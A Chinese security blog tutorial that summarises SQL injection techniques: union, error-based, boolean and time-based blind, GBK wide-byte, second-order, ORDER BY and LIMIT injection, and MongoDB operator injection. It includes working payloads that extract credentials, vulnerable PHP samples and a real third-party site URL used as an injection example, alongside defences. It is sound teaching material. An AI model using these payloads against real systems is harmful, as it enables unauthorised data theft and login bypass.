---
title: SQL 注入总结
categories:
  - Web安全
tags:
  - SQL注入
  - 预处理
  - NoSQL
abbrlink: e27f2b73
date: 2018-11-27 15:37:18
---

&#8195;&#8195;详细介绍了常见的 SQL 注入，包括联合注入、盲注（基于bool型、基于时间、基于报错）、宽字节注入、二次注入，对涉及到的编码转换和类型转换也做了相关说明。简单介绍了预编译的缺陷以及非关系型数据库的注入。
<!-- more -->

## 基础介绍
&#8195;&#8195;就像渗透之前的信息收集一样，对目标了解越多，越能事半功倍。虽然有SQLMap这样的的注入神器，但手工注入不可荒废，推荐一个练习SQL注入的环境[sqli-labs](https://github.com/Audi-1/sqli-labs)，网上资料很多。

### 数据库介绍
&#8195;&#8195;首先要对常见数据库类型有所了解，如：
> 1. MySQL，特点是**开源**，也是大家最常见最熟知的，虽说MySQL市场份额并不是最多，但却是测试人员最常见的，为什么呢？
> 2. Oracle，特点是**高安全**、**高稳定**、**高并发**，当然还贵，这些特点DB2貌似也都有，这两个数据库并不怎么熟悉，总之常用于金融、银行等行业；
> 3. MSSQL，SQL Server，高度集成化，**比较安全便捷**，微软大礼包，微软一整套的解决方案还真是省心，适用不怎么缺钱的中小企业；
> 4. DB2，IBM产品，没接触过，很多银行、金融企业必备的数据库。据说DB2适用于**海量数据**的处理，**稳定性**和**安全性**也很高，难道Oracle不具备这些能力吗？我更倾向于另一个解释，IBM全家桶吧，捆绑于IBM的解决方案、大型机等。

&#8195;&#8195;以上可以有个大概的了解吧，因为像DB2、Oracle等数据库的接触场景太少，也只能搜一些其他资料总结一下。虽说金融、银行等企业的核心业务基本都跑在DB2上，但实际上所有公司都根据不同于业务，同时也在使用Oracle、MySQL以及一些NoSQL。

### 数据库类型判断
1. 报错信息，这个可以说是最便捷的，报错信息一般可以直接定位到数据库类型甚至版本；
2. 构造语句，不同的数据库都有自己的特定的执行语句：

**注释** 
```
MySLQ：
单行注释形如 `#注释`
单行注释形如 `-- 注释`（注意后面至少一个空格）
多行注释形如 `/*注释*/`

MSSLQ和Oracle：
单行注释形如 `--注释`
多行注释形如 `/*注释*/`
```
注：ACCESS无注释语句，也无法使用函数注入。

**系统表**
```
and exists (select count(*) from sysobjects)   #MSSQL
and (seiect count(*) from dual)<>0             #Oracle
and exists (select count(*) from msysobjects)  #ACCESS
and (select count(versionnumber) from sysibm.sysversions)<>0  #DB2
```
&#8195;&#8195;`SysObjects` 是MSSQL的系统表，第一句返回正常则为MSSQL；`Dual` 和 `user_tables` 是Oracle的系统表；`MSysObjects`是ACCESS的系统表，但是默认无权限查询该表，所以返回类似 `无权限` 的错误则为ACCESS；`Sysibm.SysVersions` 是DB2的系统表；对于MySQL5.0之后可以尝试 `information_schema` 数据库。

### 注入点类型判断
&#8195;&#8195;查询语句可能如下：
```
数字型：select * from <table> where id = num
字符型：select * from <table> where name = 'str'
字符型：select * from <table> where name = ('str')
搜索型：select * from <table> where name like '%str%'
```

&#8195;&#8195;数字型、字符型、搜索型这几种注入大家都比较熟悉，判断方法无非重言式和矛盾式：
```
注入点：` 和 "
数字型：1 and 1=1                和 1 and 1=2
字符型：1' and '1'='1            和 1' and '1'='2
字符型：1') and ('1')=('1        和 1') and ('1')=('2
搜索型：%' and '1'='1' and '%'=' 和 %' and '1'='1' and '%'='
```
&#8195;&#8195;判断注入类型很重要，因为第一个查询是需要闭合的，如下假如你已经知道存在注入，数字型应该构造 `1 and 1=1` ，字符型应该构造 `1' and 1=1` ，才能闭合第一个查询，构造第二个查询：
```
数字型：select * from <table> where id =1 and 1=1 -- +
字符型：select * from <table> where name ='1' and 1=1 -- +
```
&#8195;&#8195;我们用重言式 `and 1=1` 一般是期望返回一个正确的页面，但如果在字符型匹配中使用了数字型注入，返回的将会是错误页面，所以新手在刚开始接触，不能为了达到结果一股脑乱试，要知道原理。同理也可使用 `or` ，以及 `-1` 等。判断类型主要是为了**闭合原查询语句**然后**构造新的查询语句**，字符型搜索型显然闭合方式不同，后面获取数据时候就不需要刻意闭合第二个查询了，直接 `--+` 注释即可。

## 常规注入
### 联合注入
&#8195;&#8195;有可控的回显点我们一般使用联合查询，利用 `UNION SELECT` 控制回显点爆出字段值。下面是一个字符型联合注入的例子，数字型和搜索型也大同小异，如果确定注入点和类型后，就可以开始获取数据了，一般步骤如下：
1. 判断列数：`order by 字段/列数` ，该命令是对**查询结果**按照指定字段排序，默认ASC升序（DESC降序），但是字段我们并不一定知道，所以一般都是使用数字（该字段所在列数）代替。这个数字的大小必须小于等于查询结果的列数，否则报错，因为你不可能对一个只有3列的数据按照第4列排序，所以能以此判断查询结果的列数。**这里猜到的列数是查询结果的列数，不一定是该表的所有列数**，这取决于后端使用的查询语句，比如我们猜解出 `order by 2`，那么：
```
select * from users order by 2;  #说明该表只有2列
select uname passwd from users order by 2; #只查询了2列，该表有几列未知
```
2. 获取数据：`union select xxx` ，联合查询，`UNION` 操作符用于合并两个或多个 `SELECT` 语句的结果集，其内部的每个 `SELECT` 语句必须拥有**相同列数**，列也必须拥有相似的数据类型，而且 `UNION` 会去重选取不同的值，获取重复值需要用 `UNION ALL` 。如果是字符型注入，查询数据库如下：
```
id=-2' union select 1,database()--+
```
有时候我们会构造一个负数让第一个查询失败，目的是什么呢？
```
$sql="SELECT * FROM users WHERE id='$id'";
$result=mysqli_query($con,$sql);
$row = mysqli_fetch_array($result);
if($row){...}
```
&#8195;&#8195;如上使用了函数 `mysql_fetch_array()`，该函数从结果集中取得**一行**作为关联数组，或数字数组，或二者兼有（具体哪种要看第二个参数），但是我们拼接了 `UNION` 后，最后的查询结果是一个两行的记录，而该函数并没有做循环，所以只获取第一组数据，导致我们构造的查询结果无法显示，要想显示我们的结果，就需要让第一组查询结果为空：
![unionselect](/imgs/unionselect1.png)

&#8195;&#8195;接下来的查询就比较简单了，因为只有两个可控的回显点，所以 我们需要用 `limit` 来不断猜解各个字段，实际中我们经常需要用十六进制或者ASCII编码来代替字符串类型：
```
id=-1' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 3,4--+
id=-1' union select 1,2,column_name from information_schema.columns where table_name='users' limit 4,5--+
id=-1' union select 1,2,concat_ws(':',user(),username, password) from users--+

id=-1' union select 1,2,schema_name from information_schema.schemata--+ 
id=-1' union select 1,2,concat_ws(char(32,58,32),user(),username, password) from users--+
```
&#8195;&#8195;`information_schema` 是系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。`SCHEMATA`表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，`show databases` 的结果取之此表，我们最常用的是 `schema_name` ，该字段保存了数据库名。
&#8195;&#8195;`TABLES表`，我们最常用的是 `table_name` 对应表名，`table_schema` 对应数据库名。
&#8195;&#8195;`COLUMNS表`，我们最常用的是 `table_name` 对应表名，`table_schema` 对应数据库名，`column_name` 对应列名。

### 报错注入
&#8195;&#8195;没有可控回显点，但是有报错信息，我们可以使用报错注入，基于错误的注入，前提就是能输出错误信息，涉及报错的点有三个：
> 1.  `php.ini` 中的 `display_errors=On` ；
> 2.  `PHP` 的函数 `error_reporting()` ；
> 3.  `MySQL` 的函数 `mysqli_error()` ;

&#8195;&#8195;其实就算 `display_errors=Off` `error_reporting()`，如果代码中有类似 `echo mysqli_error()` 的调试信息，依然会出现报错信息，注意这个函数不同于 `mysql_error()` ，它需要有一个参数。虽然报错函数有十几种，但是我测试了下通用性比较强的并不多，可能是版本问题：
```
select 1,count(*),concat(user(),0x7e,@@version)a from users group by a;
select 1,count(*),concat(user(),0x7e,@@version,floor(rand(0)*2))a from users group by a;
select exp((select * from(select @@version)x));
select exp(~(select * from(select @@version)x));
select extractvalue(1,concat(user(),0x7e,@@version));
select updatexml(1,concat(user(),0x7e,version()),1);
select * from (select name_const(version(),1),name_const(version(),1)) as x;

```
&#8195;&#8195;结果如图：
![errorbase](/imgs/errorbase.png)
简单分析下原理：
**Floor()**
`floor` 报错需要三个条件：
> 1. count(*)，返回表中的记录数（行数），
> 2. floor(rand(0))，rand()是一个0到1的随机数，但是rand(x)是一个0到1的固定值，floor向下取整，所以 `floor(rand(0)*2)` 前六位是 `011011`；
> 3. group by，将查询结果按指定列的值分组，值相等的为一组。

&#8195;&#8195;`count` 和 `group by` 合在一起用就会建立一个虚拟表，从数据库获取查询结果，先看虚拟表中是否存在，不存在则插入该记录，存在则给 count(*) 字段对应的值加1，报错的关键是**插入**一个重复的**主键**，如下语句：
```
select count(*) from users group by floor(rand(0)*2);
```
&#8195;&#8195;根据[文档](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)说明，在 `group by` 或者 `order by` 子句中使用 `rand()` 会产生预期之外的结果，因为查询过程中 `rand()` 会被多次计算，使用 `group by` 的时候 `floor(rand(0)*2)` 会被执行一次，如果虚表不存在记录，**插入**虚表的时候 `floor(rand(0)*2)` 会被再执行一次，该函数的值是固定的，前六位是 `011011`，那么看一下具体插入表时候的过程：
> 1. 查询前默认会建立空虚拟表；
> 2. 取第一条记录，执行 `floor(rand(0)*2)`，发现结果为 0 (**第一次计算**)，查询虚拟表发现 0 的键值不存在，则 `floor(rand(0)*2)` 会被再计算一次，结果为 1 (**第二次计算**)，插入虚表，这时第一条记录查询完毕；
> 3. 查询第二条记录，再次计算 `floor(rand(0)*2)`，发现结果为 1 (第三次计算)，查询虚表发现 1 的键值存在，所以 `floor(rand(0)*2)` 不会被计算第二次，直接 count(*) 加 1 ，第二条记录查询完毕；
> 4. 查询第三条记录，再次计算 `floor(rand(0)*2)`，发现结果为 0 (**第4次计算**)，查询虚表发现键值没有 0 ，则数据库尝试插入一条新的数据，在插入数据时 `floor(rand(0)*2)` 被再次计算，作为虚表的主键，其值为 1 (**第5次计算**)，然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (**主键键值必须唯一**)，所以插入的时候报错；
> 5. 整个查询过程 `floor(rand(0)*2)` 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要3条以上数据，使用该语句才会报错的原因。

&#8195;&#8195;其实不仅仅 `rand(0)`，只要前五位是 `01101` 或者与其相反都可以稳定报错，下面三个都可以。而且也不是必须乘 2 ，乘 2 只是为了让随机数较小。另外 `rand()` 等也可以实现报错，只不过比较随机，不会稳定三条记录报错。
```
rand(0)   01101 10011
rand(4)   01101 11111
rand(11)  10010 01101
```

**ExtractValue()**
&#8195;&#8195;该函数从 XML 字符串中提取一个值，格式如下：
```
ExtractValue(xml_frag, xpath_expr)
```
&#8195;&#8195;第一个参数是 XML 字符串，第二个参数是 XPath 表达式，`XPath` 是一种用来确定XML文档中某部分位置的语言，具体语法参考[文档](http://www.w3school.com.cn/xpath/xpath_syntax.asp)，我们需要做的是构造第二个参数使之报错，输出我们的查询结果。

**UpdateXML()**
&#8195;&#8195;该函数使用一个新的 XML 字符串替换目标 XML 字符串的一部分，格式如下：
```
UpdateXML(xml_target, xpath_expr, new_xml)
```
&#8195;&#8195;第一个参数是目标 XML 字符串，第二个参数是 XPath 表达式，第三个参数是新的 XML 字符串，我们需要做的是构造第二个参数使之报错，输出我们的查询结果。

**Name_Const**
&#8195;&#8195;该函数使列具有指定的名称，列名重复时报错，格式如下：
```
name_const(name,value)
```
&#8195;&#8195;另外几个函数未复现成功，在此略过：polygon()，multipoint()，multilinestring()，linestring()，multipolygon()。

其他几种数据库的报错：
```
PostgreSQL: /?param=1 and(1)=cast(version() as numeric)-- 
MSSQL: /?param=1 and(1)=convert(int,@@version)-- 
Sybase: /?param=1 and(1)=convert(int,@@version)-- 
Oracle >=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select 
replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--
```

### bool注入
&#8195;&#8195;如果既没有可控回显点，也没有报错信息，但是页面有正常和异常两种显示，我们就可以构造查询，通过页面状态判断猜解是否正确，其实是爆破的一种类型，本质上是一个字符一个字符的**猜解**，常用函数：
```
LENGTH(s): 返回字符串 s 的长度
LEFT(s,n)：返回字符串 s 的前 n 个字符
ASCII(s)：返回字符串 s 的第一个字符的 ASCII 码
SUBSTR(s, start, length)：从字符串 s 的 start 位置截取长度为 length 的子字符串
MID、SUBSTR、SUBSTRING 一样
```
简单例子：
```
1' and (length(database()))>10;
1' and ascii(substr((select database()),1,1)>144;
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>60;
```
代码另行补充，网上也有很多可以用。

### 延时注入
&#8195;&#8195;如果没有可控的回显点，没有报错信息，bool真假页面无变化，可以考虑延时注入，常用函数如下：

```
SLEEP (pauses)：休眠，参数为休眠的时长，单位秒
IF(expr1,expr2,expr3)：判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
FIND_IN_SET(string, string_list)：返回字符串列表中字符串的位置
```
简单例子：
```
1' or sleep(2);
1' and if(ascii(substr(database(),1,1))>115,0,sleep(5));
1' union select 1,2,sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));
1' and if(ascii(substring((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=116,sleep(5),1);
```
其他数据库的延时函数：
```
Mysql： BENCHMARK(100000,MD5(1))  or sleep(5) 
Postgresql： PG_SLEEP(5)   OR GENERATE_SERIES(1,10000) 
Mssql： WAITFOR DELAY '0:0:5' 
```

代码另行补充，网上也有很多可以用。

### 宽字节注入
**漏洞原因**
为了防止 SQL 注入，PHP 提供了对特殊字符的转义功能：
> 1. `magic_quotes_gpc=On`，PHP配置，GPPC 在 PHP5.4 之后已经被官方移除。
> 2. `addslashes`，PHP函数。

&#8195;&#8195;这两种方法都是为了实现一个功能，为 POST、GET、COOKIE、$_SERVER（该变量不受GPC保护） 过来的特殊字符前加反斜杠 `\`（也就是做转义），如单引号 `'`、双引号 `"`、反斜线 `\`、`NULL`（NULL 字符）等，但就是这个防止 SQL 注入的功能，成了 SQL 注入的突破点，为避免用户过度依赖这个不是特别安全的函数，**GPC 在 PHP5.4 之后已经被官方移除**。下面看看漏洞产生的过程：
> 1. 构造语句 `%df%27`（%27 是单引号 `'` ） ；
> 2. 首先 `addslashes` 会在单引号前加反斜杠转义，变成 `%df%5c%27`（%5c 是反斜杠 `\` ）；
> 3. 然后因为数据库设置了 GBK 编码，GBK 是双字节编码，发现 `%df%5c` 在其**汉字编码**范围内，于是 `%df%5c` 被转换成"運"，单引号 `%27` 逃逸；
> 4. 最后MySQL查询时候执行的其实是 `運'`，单引号可闭合代码造成注入漏洞。
> 5. 过程 %df%27--(addslashes)--%df%5c%27--(GBK编码)--運'

&#8195;&#8195;可以看出，**主要原因是 `%df%5c` 被 GBK 编码成了一个汉字**，导致转义符 `\` 被吃掉，但实际上两个字节的编码并不少，比如 GB2312、GB18030、BIG5 等，为什么单单 GBK 出问题呢，这个又涉及到了编码取值范围。
> 1. GBK 编码总体范围 8140-FEFE，第一部分是单字节编码（00-7F），这128个编码与ASCII相对应。
另一部分是双字节编码，第一字节的范围是 81-FE 之间，第二字节的范围是 40-FE 之间。
> 2. GB2312 编码总体范围 A1A1-F7FE，第一字节范围是0xA1-0xF7，第二字节范围是0xA1-0xFE。

&#8195;&#8195;可以看出 `0xdf5c` 的 `0xdf` 在 GBK 和 GB2312 的第一字节范围，但是 `0x5c` 却不在 GB2312 的第二字节范围，所以在 GB2312 看来 `0xdf5c` 不在其编码范围内，所以不会造成反斜杠 `\` 被吃掉。同理如果我们构造的是 `%2c%27` ，经转义称为 `%2c%5c%27` ，而 `%2c` 的 ASCII 码小于 128 ，不在 GBK 的汉字
编码范围内，`%2c%5c` 也不会被编码成汉字。

**防御措施**
1. 替换不安全的函数 `addslashes` ：
> • 先用 `mysqli_set_charset` 指定与数据库服务器进行数据传送时要使用的默认字符集。
> • 再把 `addslashes` 全部替换为 `mysqli_real_escape_string` 过滤输入。

&#8195;&#8195;`mysql_real_escape_string` 与 `addslashes` 的不同之处在于其会考虑**当前设置的字符集**，不会出现前面 `e5` 和 `5c` 拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？就是 `mysql_set_charset` ，该函数不仅实现了 `set names` 的功能，还为 `mysql_real_escape_string` 指定了当前字符集，详细介绍参考[字符集设置](https://www.gokuweb.com/websec/ab567a6.html#字符集设置)。防御代码：
```php
<?php
$con = mysqli_connect('localhost', 'root', '123456') or die('bad!');
mysqli_set_charset($con,'gbk');
mysqli_select_db($con,'test') OR emMsg("连接数据库失败，未找到您填写的数据库");
$id = isset($_GET['id']) ? mysqli_real_escape_string($con,($_GET['id'])) : 1;
$sql = "SELECT * FROM news WHERE tid='{$id}'";
$result = mysqli_query($con,$sql) or die(mysqli_error($con)); //sql出错会报错，方便观察
?>
```

2. 如果不能把 `addslashes` 全部替换为 `mysql_real_escape_string` 的话，就需要将 `character_set_client` 设置为 `binary` ：
```php
<?php
$con = mysqli_connect('localhost', 'root', '123456') or die('bad!');
mysqli_query($con,"SET NAMES 'gbk'");
mysqli_query($con,"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary");
mysqli_select_db($con,'test') OR emMsg("连接数据库失败，未找到您填写的数据库");
$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
$sql = "insert into news(tid,title,content) values('7','新闻7','$id')";
$result = mysqli_query($con,$sql) or die(mysqli_error($con)); //sql出错会报错，方便观察
?>
```
&#8195;&#8195;当 MySQL 服务端接收到客户端的数据后，会认为他的编码是 character_set_client，然后会将之将换成 character_set_connection 的编码，然后进入具体表和字段后，再转换成字段对应的编码。上面也提到**漏洞的主要原因是做了 GBK 编码，确切的说是 character_set_client=gbk 造成的**，所以防御的方式就是 `character_set_client=binary`， 我曾一度疑惑为什么这里设置 Binary 能防止注入，无非就是 GBK--GBK 变成了 Binary--GBK 的转换，可就算是 Binary，`%df5c27` 并没有发生任何变化，接着转换成 GBK 还不是 `運'` 吗？我尝试开启 query log 来查看服务端收到的请求（[开启日志方式看这里](#开启MySQL日志)），发现两种情况下服务端收到的请求是一模一样的，真相只有一个，**漏洞是进入服务端之前产生的**。Client 指定的编码属于客户端，Connection 指定的编码已经属于服务端了。
&#8195;&#8195;所以在 character_set_client 这一步，Binary 和 GBK 的区别其实是；
```
select * fron news where tid='0xdf5c27 or 1=1';
select * fron news where tid='運' or 1=1';
```
&#8195;&#8195;二进制或者说十六进制下 `0x5c` 被解释成转义字符，所以 `0x5c27` 是一个被转移的单引号 `'` ，只是一个普通的字符，没有闭合的功能，自然不会产生注入。GBK 下反斜杠已经被吃掉，所以产生注入。之后它们都做 character_set_connection 指定的 GBK 编码，所以看起来一模一样，服务端收到的请求也一样，但是语法已经不一样了，第一条是匹配字符串 `運' or 1=1`，第二条是匹配 `運` 和 `1=1`。**这部分是个人根据多次实验推理得出，没有权威解释，如有误解希望能留言指点**。

**功亏一篑之 UTF-8 转 GBK**
&#8195;&#8195;有时候 Javascript 或 Flash 中传递的数据是 utf-8 编码，如果数据库和页面编码是 gbk 编码，在查询之前会用 iconv 进行转码，这个函数不是 PHP 标准函数所以需要安装模块才能用：
```
<?php
$con = mysqli_connect('localhost', 'root', '123456') or die('bad!');
mysqli_select_db($con,'test') OR emMsg("连接数据库失败");
mysqli_query($con,"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary");
$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
$id = iconv('utf-8', 'gbk', $content);
$sql = "SELECT * FROM news WHERE tid='{$id}'";
$result = mysqli_query($con,$sql) or die(mysqli_error($con)); //sql出错会报错，方便观察
?>
```

绕过反斜杠有两种方式：
> 1. 构造宽字节吃掉反斜杠，使单引号逃逸。UTF-8 转 GBK 没法使用宽字节，因为根据 UTF-8 规则，第一个字节的前 n 位都是 1 ，后面字节的前两位一律为 10 ，所以 `0x0000005c` 不在 UTF-8 范围，出现 `\` 的话会直接报错。
> 2. 构造两个反斜杠使之转义，单引号逃逸。我们输入 `錦%27`，`錦` 的 UTF-8 编码是 `0xE98CA6`，GBK 编码是 `0xE5C5`，所以先经过 addslashes 变成 `0xE98CA6 5C27` ，再经过 iconv 之后成为 `0xE55C 5C27`，到这一步如果是 set_client=gbk 还不会出问题，但是这里指定了 character_set_client=binary，二进制下 `%5C%5C` 就把反斜杠转义了，单引号逃逸产生注入。转换过程：%df%27===(addslashes)===>%df%5c%27===(iconv)===>%e5%5c%5c%27。
> 3. 上一步的延伸，其实设置成 `set names utf8` 也能用同样的方式注入，因为 `0xE55C5C27` 在做 UTF8 编码时候，不在 UTF8 有效范围，`0xe5` 被解释成 `?`，两个 `0x5c` 把反斜杠转义，单引号逃逸。

![iconv1](/imgs/iconv1.png)

**功亏一篑之 GBK 转 UTF-8**
和上面差不多，只不过换成了 GBK 转 UTF-8，如下：
```
<?php
$con = mysqli_connect('localhost', 'root', '123456') or die('bad!');
mysqli_query($con,"SET NAMES 'gbk'");
mysqli_select_db($con,'test') OR emMsg("连接数据库失败");
mysqli_query($con,"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary", $conn);
$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
$id = iconv('gbk', 'utf-8', $content);
$sql = "SELECT * FROM news WHERE tid='{$id}'";
$result = mysqli_query($con,$sql) or die(mysqli_error($con)); //sql出错会报错，方便观察
?>
```
&#8195;&#8195;GBK 汉字 2 字节，UTF-8 汉字 3 字节，构造形如 `%df%27` 即可宽字节注入，反斜杠在 iconv 阶段就被吃了，问题实际出在 PHP 而不是 MySQL。

&#8195;&#8195;如果使用 `set names UTF8` 指定了 UTF-8 字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的 GBK 字符使用 iconv 函数（或者mb_convert_encoding）先转为 UTF-8 然后再拼接入 SQL 语句，也会造成注入，构造 `%e5%5c%27`，也就是 GBK 编码的 `錦`，转化过程：e55c27--(addslashes)--e55c5c5c27--(iconv)--e98ca65c5c27，`0xE98CA6` 就是 `錦` 的 UTF-8 编码。

### 二次注入
&#8195;&#8195;用户构造恶意数据存储在数据库，当数据库再次读取此数据时候造成注入。开发者对用户输入的数据做了过滤或者转义等处理，但写进数据库的还是“脏数据”，当 Web 应用调用“脏数据”时候发生了注入，概括起来很简单：
> 1. 恶意数据的写入
> 2. 恶意数据的调用

如下图所示：
![secondinj](/imgs/secondinj.png)

&#8195;&#8195;实验 sqli-labs 的 Less24 就是二次注入，我们注册一个 `admin'#` 的账户，登录后修改密码就会发生注入：
```
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass';
UPDATE users SET PASSWORD=’12345′ where username='admin'#' and password='$curr_pass';
```
直接修改 `admin` 的密码，`#` 后面被注释。

## 预编译注入
&#8195;&#8195;确切的说是找到无法做预处理的点进行注入，做过预处理的输入点基本上是无懈可击的，但预处理并不适用于所有情况，比如 Order by、 Group by、 Limit 以及查询中的字段名，这几种情况是不能使用占位符 `?` 代替的，因为预处理会把参数用单引号包围，虽不至报错但会失效，这些需求还需要使用拼接的方式，做好转义：
```
$sql = "SELECT * FROM news WHERE title= ? order by $id";
$sql = "SELECT * FROM news WHERE title= ? group by $id";
$sql = "SELECT $content FROM news WHERE title= ?";
```

### Order by
**根据返回结果顺序判断注入：**
1. IF
```
select * from news order by if(1=1),1,(select 1 from INFORMATION_SCHEMA.SCHEMATA));
select * from news order by if(1=2),1,(select 1 from INFORMATION_SCHEMA.SCHEMATA));
```
&#8195;&#8195;因为 Order by 的值需要为唯一，而 `select 1 from INFORMATION_SCHEMA.SCHEMATA` 会返回多个，所以会产生报错。

2. CASE WHEN
```
http://quan.zhubajie.com/index/list-fid-5-order-(case when(1=1) then dateline else membernum end)-page-1.html
http://quan.zhubajie.com/index/list-fid-5-order-(case when(1=2) then dateline else membernum end)-page-1.html
```

3. REGEXP

```
SELECT * from news order by (select 1 regexp if(1=1,1,0x00));
+-----+-------------+-----------------------+
| tid | title       | content               |
+-----+-------------+-----------------------+
|   1 | 新闻1       | 这是第一篇文章        |
|   2 | 新闻2       | 这是第二篇文章        |
|   3 | 新闻3       | 我是第三篇文章        |
+-----+-------------+-----------------------+
```
在 `1=2` 时候，我测试也能正确查询，可能是版本原因？

**利用方法**
```
select * from news order by updatexml(1,if(1=1,user(),2),1);
select * from news order by if(substr(user(),1,1)='r',sleep(1),1);
```
其实就是盲注的方式。

### Limit
**无 Order by**
```
(SELECT 1 from mysql.user limit 0,1) union (select 234);
+-----+
| 1   |
+-----+
|   1 |
| 234 |
+-----+
2 rows in set (0.01 sec)
```
&#8195;&#8195;可能也是版本原因，我测试时候两个查询必须括起来，否则语法错误，这样的话也无法利用。

**有 Order by**
&#8195;&#8195;Limit 在 `5.0.0 < MySQL < 5.6.6` 版本可以使用 `procedure analyse`函数注入，但是高版本对具体处理做了限制，该方法已失效，8.0 版本甚至不能使用该函数：
```
mysql> SELECT id FROM test WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version())));

mysql> SELECT 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
ERROR 1105 (HY000): XPATH syntax error: ':5.1.73-log'

mysql> SELECT 1 from mysql.user order by 1 limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(50000000,SHA1(1)),1))))),1);
ERROR 1105 (HY000): XPATH syntax error: ':0'
```

## NoSQL 注入
### NoSQL 和 SQL
&#8195;&#8195;关系型数据库遵循 ACID 规则：原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）、持久性（Durability）。而 Nosql 数据库遵循 BASE 原则：基本可用（Basically Availble）、软/柔性事务（Soft-state ）、最终一致性（Eventual Consistency））。由于关系型数据库的数据强一致性，所以对事务的支持很好。关系型数据库支持对事务原子性细粒度控制，并且易于回滚事务。而 NoSQL 数据库是在 CAP（一致性、可用性、分区容忍度）中任选两项，因为基于节点的分布式系统中，很难全部满足，所以对事务的支持不是很好，虽然也可以使用事务，但是并不是Nosql的闪光点。非关系型数据库一般有以下几种分类：
> 1. Key-Value（键值对），如 Redis、Memcached
> 2. Document-Oriented（文档），如 MongoDB
> 3. Column-Family（列族），如 HBase
> 4. Graph-Oriented（图），如 Neo4J

### MongoDB 注入
&#8195;&#8195;以 MongoDB为例，输入正确的用户名和密码我们可以看到登录成功的页面，输入错误的看到登录失败的页面：
```
<?php
$manager = new MongoDB\Driver\Manager("mongodb://mongo:27017");
$dbUsername = null;
$dbPassword = null;
$data = array(
'username' => $_REQUEST['username'],
'password' => $_REQUEST['password']

); 
$query = new MongoDB\Driver\Query($data);
$cursor = $manager->executeQuery('test.users', $query)->toArray();
$doc_failed = new DOMDocument();
$doc_failed->loadHTMLFile("failed.html");
$doc_succeed = new DOMDocument();
$doc_succeed->loadHTMLFile("succeed.html");
if(count($cursor)>0){
echo $doc_succeed->saveHTML();
}
else{
echo $doc_failed->saveHTML();
}
```
假设用户名:xiaoming 密码:xiaoming123 ，流程如图：
![mongologin](/imgs/mongologin.png)

&#8195;&#8195;这里对用户输入没有做任何校验，直接构造 payload:username[$ne]=1&password[$ne]=1 的 payload，如图：
![mongoinj](/imgs/mongoinj.png)

&#8195;&#8195;对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们输入 value=1 那么，也就是输入了一个 value 的值为 1 的数据。如果输入 value[$ne]=1 也就意味着 value=array($ne=>1) ，在 MongoDB 中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用 username[$gt]=&password[$gt]= 作为 payload 进行攻击。

详细介绍见参考资料。
## 引申
### MySQL单/双/反引号
&#8195;&#8195;SQL 使用单引号来环绕文本值，但是大部分数据库系统也接受双引号。如果是数值，一般不建议使用引号。单双引号的相互包裹能达到转义的效果，反引号能把MySQL保留字作为表名或者字段名：
```
使用双字符:
插入时          库中
'aa''b''cc'     aa'b'cc
"aa"b""cc"      aa"b"cc

使用转义字符(\):
插入时          库中
'aa\'b\'cc'     aa'b'cc
"aa\"b\"cc"     aa"b"cc

相互包裹：
插入时          库中
"aa'b'cc"       aa'b'cc
'aa"b"cc'       aa"b"cc

反引号：
插入时
create table `table`(`column` varchar(255));     成功
alter table `table` add desc varchar(10);      失败，需要反引号
alter table `table` modify `desc` varchar(30); 成功
insert into `table`(desc) values('f"xf');      失败，需要反引号
alter table `table` drop column `desc`;        成功
```

### 类型转换
&#8195;&#8195;如果对类型不同的两个值做匹配或者比较时，会出现一些奇怪的结果：
![sqlquot](/imgs/sqlquot.png)

&#8195;&#8195;上图左侧查询符合预期，但是右侧单双引号混用时出现预期之外的结果，看似引号造成的问题，实际原因是**类型转换**，参考[官方文档](https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html)，MySQL会根据需要自动将字符串转换为数字，反之亦然。
```
When an operator is used with operands of different types, type conversion occurs 
to make the operands compatible. Some conversions occur implicitly. For example, 
MySQL automatically converts strings to numbers as necessary, and vice versa.
```
&#8195;&#8195;如下所示：
```
mysql> SELECT '023bf4d'+1;
        -> 24
mysql> SELECT CONCAT(2,' test');
        -> '2 test'
```
&#8195;&#8195;我们都知道MySQL大小写不敏感（经测试数据库名和表名是区分大小写的，字段名以及具体值对大小写不敏感），字符串的比较是对其按位进行ASCII码大小作比较，图中左侧结果符合预期不在赘述。右侧因为 `age` 定义的 `int` 型，而后面的匹配对象无论使用单引号还是双引号，都是字符型，比较时会先把字符转换成数字，规则如下：
> 1. 数字开头的字符，只截取开头数字部分，如 `023bf4d` 转换为数字是`23` ；
> 2. 字母开头的字符，转化为零，如 `dd34f5` 转换为数字是 `0` ；

&#8195;&#8195;上图右侧，无论单引号中的双引号 `"` ，还是双引号中的单引号 `'` ，都被看作是字符串中的普通字符而已，并无特殊意义，现在来看输出结果其实也是意料之内。

### MySQL 查看表编码

```
mysql> show create table users;
